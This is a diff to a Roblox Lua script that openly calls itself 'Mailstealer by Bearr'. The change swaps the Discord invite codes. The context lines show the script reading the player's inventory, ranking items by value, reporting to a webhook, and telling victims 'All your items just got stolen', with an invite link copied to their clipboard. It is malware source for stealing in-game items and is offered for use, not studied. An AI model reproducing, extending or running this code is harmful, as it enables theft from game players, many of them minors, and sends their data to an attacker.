@@ -6,7 +6,7 @@ local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
-local MailMessage = "Join gg / rZmNK6Ptxw to get back"
+local MailMessage = "Join gg / GsFp84dbQf to get back"
 local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
@@ -125,7 +125,7 @@ local function SendMessage(username, diamonds, webhookUrl, recipient)
             ["color"] = 3447003,
             ["fields"] = fields,
             ["footer"] = {
-                ["text"] = "Mailstealer by Bearr. discord.gg/rZmNK6Ptxw"
+                ["text"] = "Mailstealer by Bearr. discord.gg/GsFp84dbQf"
             }
         }}
     }
@@ -321,6 +321,6 @@ if #sortedItems > 0 then
     end
 
     local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/rZmNK6Ptxw")
-    setclipboard("discord.gg/rZmNK6Ptxw")
+    message.Error("All your items just got stolen by Bearr's mailstealer!\n Join discord.gg/GsFp84dbQf")
+    setclipboard("discord.gg/GsFp84dbQf")
 end
